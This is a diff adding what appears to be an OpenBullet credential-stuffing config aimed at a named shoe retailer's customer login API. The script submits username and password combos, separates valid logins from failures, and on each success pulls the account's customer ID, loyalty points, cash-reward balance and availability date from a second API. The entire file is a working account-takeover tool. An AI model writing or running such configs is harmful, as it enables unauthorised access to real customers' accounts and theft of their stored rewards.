@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Foot Asylum",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:24:20.2149126+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://r9udv3ar7g.execute-api.eu-west-2.amazonaws.com/prod/customer/auth" 
+  CONTENT "{\"channel_id\":3,\"fascia_id\":1,\"customer\":{\"email\":\"<USER>\",\"customer_id\":\"\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "title\": \"Invalid user name / password" 
+  KEYCHAIN Success OR 
+    KEY "customer_id\": \"" 
+PARSE "<SOURCE>" LR "customer_id\": \"" "\"," -> VAR "CustomerID" 
+REQUEST POST "http://apiv2.asylumapi.com/api/v1/unlockd/profile/fromid" 
+  CONTENT "{\"id\":\"<CustomerID>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "points\":\"" "\",\"cash\":\"" -> CAP "Points : " 
+PARSE "<SOURCE>" LR "cash\":\"" "\",\"eligible" Recursive=TRUE -> CAP "Cash Rewards : " "£" "" 
+PARSE "<SOURCE>" LR "eligible\":\"" "\",\"expiry\":\"" -> CAP "Available From : " 
